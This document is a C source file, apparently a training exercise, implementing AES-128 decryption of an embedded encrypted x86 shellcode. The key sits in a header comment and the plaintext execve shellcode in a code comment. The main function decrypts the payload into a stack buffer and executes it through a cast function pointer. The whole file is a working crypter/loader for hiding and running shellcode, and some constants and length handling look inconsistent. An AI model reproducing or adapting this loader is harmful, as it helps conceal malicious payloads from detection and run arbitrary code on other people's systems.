/*
	Author: John
	AES Decryptor for 128 bits.  Rev FINAL

	Sources:
	* NIST FIPS Publication 197, Advanced Encryption Standard (AES) November 26, 2001
	* kavaliro.com/wp-content/uploads/2014/03/AES.pdf
	* infosecwriters.com/text_resources/pdf/AESbyExample.pdf
	* engineering.purdue.edu/kak/compsec/NewLectures/Lecture8.pdf

	Encrypted shellcode: execve-stack shellcode
	key: "lookatthedefensetim"

*/


#include<stdio.h>
#include<stdlib.h>
#include<stdint.h>
#include<string.h>
#include"sbox.h"


// AES specific definitions
#define AES_N  32
#define AES_B  240
// key length
#define NK 8
 // block size
#define NB 4
 // number of rounds
#define NR 10

// Define nibbles for indexing
#define HI_NIBBLE(b) (((b) >> 4) & 0x0F)
#define LO_NIBBLE(b) ((b) & 0x0F)

// Initialize Inverse MixColumns matrix
uint8_t inverse_mixer[4][4] = { {0x0e, 0x0b, 0x0d, 0x09},
																{0x09, 0x0e, 0x0b, 0x0d},
																{0x0d, 0x09, 0x0e, 0x0b},
																{0x0b, 0x0d, 0x09, 0x0e}
															};

// Define Rcon array
const uint8_t Rcon[16] = { 0x8d, 0x01, 0x02, 0x04, 0x08, 0x10, 0x20, 0x40, 0x80, 0x1b, 0x36, 0x6c, 0xd8, 0xab, 0x4d, 0x9a };

// Define minimum key length
#define MIN_LENGTH	16


// Unencrypted shellcode below
// unsigned char shellcode[] = \
// "\x31\xc0\x50\x68\x2f\x2f\x6c\x73\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80";

// Encrypted execve-stack shellcode
unsigned char encrypted_shellcode[] = \
"\xc2\x7d\x1f\xd0\xcf\x8b\x56\x35\xa2\x24\x4a\x93\x33\x09\x09\x5c\xe0\x7c\x2e\xb9\x70\x92\x54\x2d\xc3\xe5\x0c\x6c\x1e\xff\x8a\x53";


/*****************************************************************************************************/
/*  FUNCTIONS FOR ENCRYPTION ROUNDS
/*
/*
/*****************************************************************************************************/
// Cipher transformation that processes the state using Inverse S-box substitutions
void InvSubBytes(uint8_t state[4][4]){

	// Execute SubBytes function per 'Ch06 Crypto7e.pdf' pg. 12
	// Each byte is an index of row x column. Ex: 0x95 = row 9, column 5
	int i, j;
	for (i = 0; i<4; i++){
		for (j = 0; j<4; j++){
				// for each byte need to look up inverse sbox value at specific index and assign to state matrix
				state[i][j] = rsbox[HI_NIBBLE(state[i][j])][LO_NIBBLE(state[i][j])];
			}
		}

	return;
}


// Decryption transformation that shifts last 3 rows by different offsets
void InvShiftRows(uint8_t shiftedRows[4][4]){

	// Execute InvShiftRows function. It's the opposite direction of 'Ch06 Crypto7e.pdf' pg. 17
	int row;
	uint8_t temp, temp2;
	for (row = 0; row<4; row++){
		if (row == 0) {
			// members are simply copied for first row
			shiftedRows[row][0] = shiftedRows[0][0];
			shiftedRows[row][1] = shiftedRows[0][1];
			shiftedRows[row][2] = shiftedRows[0][2];
			shiftedRows[row][3] = shiftedRows[0][3];
		}
		else if (row == 1) {
			temp = shiftedRows[row][3];
			// shift second row right 1 byte
			shiftedRows[row][3] = shiftedRows[1][2];
			shiftedRows[row][2] = shiftedRows[1][1];
			shiftedRows[row][1] = shiftedRows[1][0];
			shiftedRows[row][0] = temp;
		}
		else if (row == 2) {
			temp = shiftedRows[row][0];
			temp2 = shiftedRows[row][1];
			// shift third row right 2 bytes
			shiftedRows[row][0] = shiftedRows[2][2];
			shiftedRows[row][1] = shiftedRows[2][3];
			shiftedRows[row][2] = temp;
			shiftedRows[row][3] = temp2;
		}
		else {
			temp = shiftedRows[row][0];
			// shift fourth row right 3 bytes (or left 1 byte)
			shiftedRows[row][0] = shiftedRows[3][1];
			shiftedRows[row][1] = shiftedRows[3][2];
			shiftedRows[row][2] = shiftedRows[3][3];
			shiftedRows[row][3] = temp;
		}
	}

	return;
}


// Cipher transformation that takes all of the columns of the state and mixes their data to produce new columns
void InvMixColumns(uint8_t state[4][4]){

	// Execute Inverse MixColumns function per source: `http://infosecwriters.com/text_resources/pdf/AESbyExample.pdf` pgs. 8-9
	int i, j, k;
	uint8_t result[4][4] = { 0 };
	uint8_t L_state, L_invmixer, byte;

	for (i = 0; i<4; ++i){
		for (j = 0; j<4; ++j) {
			for (k = 0; k<4; ++k) {
				/* Iterate over COLUMNS in state, while iterating by inverse_mixer ROWS on the outside loop
				hence inverse_mixer[i][k] and state[k][j]
				Matrix multiplication is more complicated in inverse MixColumns.  That is why lookup tables
				E and L are used to represent Galois Field finite field multiplication
				*/

				// Handle multiplication instance for a null byte in state[k][j]; There are no NULL bytes in inverse_mixer
				if (state[k][j] == 0x00){
					result[i][j] ^= 0x00;
				}
				else {

					// First stage results from L lookup table over GF2
					L_state = L[HI_NIBBLE(state[k][j])][LO_NIBBLE(state[k][j])];
					L_invmixer = L[HI_NIBBLE(inverse_mixer[i][k])][LO_NIBBLE(inverse_mixer[i][k])];

					// Check if byte overflow occurs when summing L_state and L_invmixer. Subtract 0xff if overflow occurs.
					if (L_state + L_invmixer > 0xff) {
						byte = L_state + L_invmixer - 0xff;
					}
					else {
						// else do normal byte addition
						byte = L_state + L_invmixer;
					}

					// Add E-lookup result into temporary state matrix
					result[i][j] ^= E[HI_NIBBLE(byte)][LO_NIBBLE(byte)];

				} // end normal else statement

			} // end k
		} // end j
	} // end i

	// Store all results back into state matrix
	int row, col;
	for (row=0; row<4; row++){
		for (col=0; col<4; col++){
			state[row][col] = result[row][col];
		}
	}

	return;
}


// Cipher transformation in which a round key is added to the state using a XOR operation
void AddRoundKey(uint8_t state[4][4], uint8_t key[4][4]){

	// Simple 1-to-1 XOR operation
	int i, j;
	for (i = 0; i<4; ++i){
		for (j = 0; j<4; ++j) {
			state[i][j] ^= key[i][j];
		}
	}

	return;
}


/*****************************************************************************************************/
/*  FUNCTIONS FOR KEY EXPANSION
/*
/*
/*****************************************************************************************************/

// Cipher transformation similar to SubBytes but for word sized data
void SubWord(uint8_t wordIn[4]){

	// Execute SubBytes function per 'Ch06 Crypto7e.pdf' pg. 12
	// Each byte is an index of row x column. Ex: 0x95 = row 9, column 5
	int i;
	for (i = 0; i<4; i++){
			// for each byte need to look up sbox at specific index and assign to spot
			wordIn[i] = sbox[HI_NIBBLE(wordIn[i])][LO_NIBBLE(wordIn[i])];
	}

	return;
}

// Rotates a 4-byte word to the left by 8 bits.
// Ex: w0 = [01, 23, 45, 67] ===> w0' = [23, 45, 67, 01]
void RotWord(uint8_t wordIn[]){

		// temporarily store first byte
		uint8_t temp = wordIn[0];

		// manually shift other bytes to the left 1 position. Place temporarily
		// stored byte into last position.
		wordIn[0] = wordIn[1];
		wordIn[1] = wordIn[2];
		wordIn[2] = wordIn[3];
		wordIn[3] = temp;

		return;
}


// Cipher transformation that takes all of the columns of the state and mixes their data to produce new columns
// Algorithm source: `brainkart.com/article/AES-Key-Expansion_8410/`
void ExpandKey(uint8_t key[4][4], uint8_t word[44][4]){

	int i, j, k;
	uint8_t temp[4];

	// First 4 words of expanded key are just the key copied
	for (i = 0; i<4; ++i) {
		for (j=0; j<4; j++) {
			word[j][i] ^= key[i][j];
		}
	}

	// Handle remaining words of key expansion
	for (i = 4; i<44; i++) {
		for (j = 0; j<4; j++) {
			// Copy previous word into temporary location
			temp[j] = word[i - 1][j];
		}

			// for every fourth word, execute g(word[]) operation
			if (i % 4 == 0) {
				RotWord(temp);
				SubWord(temp);
				temp[0] ^= Rcon[i/4];
			}

			// At i = 4, w[4] = w[0] ^ g(w[3])
			for (k=0; k< 4; k++){
				// word[4][k] = word[0][k] XOR temp[k]
				word[i][k] = word[i - 4][k] ^ temp[k];
			}
	} // end i

} // end ExpandKey()


// Main decryption function that calls sub-functions in order: InvShiftRows(), InvSubBytes(),
// AddRoundKey(), and InvMixColumns() while omitting InvMixColumns() in the final round
// keySchedule is produced in the key expansion function: ExpandKey()
void Decrypt(uint8_t state[4][NB], uint8_t keySchedule[44][NB]){
	/*
		Decrypt function performs the actual decryption operations on 16-byte blocks
		of plaintext and keys.

		ciphertext matrix is already set (from state[][]) but Key Expansion must take
		place in ExpandKey(). Round keys are loaded into inputKey[4][4] one round at a time.

		Refer to 'Ch06 Crypto7e.pdf' pg. 7
	*/

	// Load keySchedule for initial AddRoundKey() starting from the last 4 words
	uint8_t inputKey[4][4] = { 0 };
	int c, d;
	for (c = 40; c< 44; c++) {
		for (d = 0; d<4; d++) {
			inputKey[d][c-40] = keySchedule[c][d];
		}
	}

	// Pass round key and input state into AddRoundKey() before start of normal rounds
	AddRoundKey(state, inputKey);

	// Do InvShiftRows(), InvSubBytes(), AddRoundKey(), and InvMixColumns() in a row
	// 9 times starting from the back of key schedule (from i = 9 to 1)
	for (int i = NR-1; i >= 1; i--) {

		InvShiftRows(state);
		InvSubBytes(state);

		// Load keySchedule for use in AddRoundKey()
		// This index should be a multiple of 4 decreasing from 36 down to 4
		int row, col;
		// i starts from 9 down to 1; NB = 4; 9*4 = 36; last inputKey group is w[4]-w[7]
		for (row = i*NB; row < (i*NB)+4; row++) {
			for (col = 0; col<4; col++) {
				inputKey[col][row - (i*NB)] = keySchedule[row][col];
			}
		}

		AddRoundKey(state, inputKey);
		InvMixColumns(state);

	} // end round iterations loop


	// Omit InvMixColumns() for final round. Proceed with InvShiftRows(),
	// InvSubBytes(), and AddRoundKey()
	InvShiftRows(state);
	InvSubBytes(state);

	// Load first 4 words of keySchedule[][] per 'Ch06 Crypto7e.pdf' pg. 7
	for (int a = 0; a< 4; a++) {
		for (int b = 0; b<4; b++) {
			inputKey[b][a] = keySchedule[a][b];
		}
	}

	// 0 is supposed to be starting index of last 4 words: 0, 1, 2, 3
	AddRoundKey(state, inputKey);

	return;
}



int main(int argc, char **argv) {
/*
	Main function needs to divide plaintext and keys into 16-byte blocks for operation by
	Decrypt() function
							*/
	unsigned char *encryption_key;
	int encryption_key_length;
	int shellcode_len = strlen(encrypted_shellcode);
	int counter = 0;

	// ciphertext[] is statically allocated in this instance. Can be changed using malloc()
	unsigned char ciphertext[40] = {0};
	// no-no function
	int (*ret)() = (int(*)())ciphertext;

	// Extract key parameter and get its length
	encryption_key = (unsigned char *)argv[1];
	encryption_key_length = strlen((char *)encryption_key);

	if (encryption_key_length < 16) {
		printf("Key too small. Should be minimum 16 characters\n");
		exit(-1);
	}


	// Number of full rounds.  Full meaning all 16 bytes of state[4][4] are filled
	// with shellcode bytes and not padding.
	int rounds = shellcode_len / 16;

	// Index counters to traverse shellcode and key bytes. This is initialized to
	// zero and set outside the loop
	int shell_index = 0;
	int key_index = 0;
	// master loop counter
	int iterations;

	// Initialize state and key matrices
	uint8_t state[4][4] = { 0 };
	uint8_t key[4][4] = { 0 };

	// Load key values from input encryption_key
	for (int b = 0; b<4; b++){
		for (int a = 0; a<4; a++){
				key[a][b] = encryption_key[key_index];
				key_index += 1;
		}
	}

	// Expand the 4x4 key to AES-128 specified size
	uint8_t key_expanded[44][4] = { 0 };
	ExpandKey(key, key_expanded);

	printf("Decrypting AES-128 Encrypted Shellcode.....\n\n\n");
	// MASTER LOOP
	// Load groups of 16 bytes of shellcode into state[4][4]
	if (shellcode_len % 16 == 0) {

		// if shellcode is a multiple of 16 do NOT perform the extra encryption round full of
		// padded bytes; hence the '<' operator.
		for (iterations = 0; iterations < rounds; iterations++){

			// break loop once end of shellcode is reached
			if (shell_index == shellcode_len) {
				break;
			}

			// Load encrypted bytes into state[][]
			int i, j;
			for (j = 0; j<4; j++){
				for (i = 0; i<4; i++){

					// Continue loading bytes into state[][] if end of encrypted shellcode not reached
					if (shell_index < shellcode_len) {
						// end of shellcode not reached. Store shellcode bytes normally.
						state[i][j] = encrypted_shellcode[shell_index];
						shell_index += 1;
					}
				} // end i
			} // end j

			// Execute Decrypt() with loaded state matrix
			// Pass state and expanded key into Decrypt() function over number of iterations
			Decrypt(state, key_expanded);

			// Next step is to place state[d][c] bytes into ciphertext[] using counter as an index
			for (int c = 0; c<4; c++){
				for (int d = 0; d<4; d++){
					ciphertext[counter] = state[d][c];
					counter+= 1;
				}
			}

		} // end iterations loop

		// Force NULL byte placement at the very end of decrypted shellcode
		ciphertext[counter] = 0x00;

	} // end shellcode_len modulo check
	// else perform normal routine that includes final round
	else {
			// Shellcode is padded and encrypted 16 bytes at a time so this block
			// should not be reached......
			for (iterations = 0; iterations <= rounds; iterations++){

				// break loop once end of shellcode is reached
				if (shell_index == shellcode_len) {
					break;
				}

				// Load encrypted bytes into state[][]
				int i, j;
				for (j = 0; j<4; j++){
					for (i = 0; i<4; i++){
						if (shell_index < shellcode_len) {
							// end of shellcode not reached. Store shellcode bytes normally.
							state[i][j] = encrypted_shellcode[shell_index];
							shell_index += 1;
						}
					} // end i
				} // end j

				// Execute Decrypt() with loaded state matrix
				// Pass state and expanded key into Decrypt() function over number of iterations
				Decrypt(state, key_expanded);

				// Next step is to place state[d][c] bytes into ciphertext[] using counter as an index
				for (int c = 0; c<4; c++){
					for (int d = 0; d<4; d++){
						ciphertext[counter] = state[d][c];
						counter+= 1;
					}
				}
			} // end iterations loop
	}  // End MASTER LOOP

	printf("\n\n");
	// call no-no function
	ret();

	return 1;

}
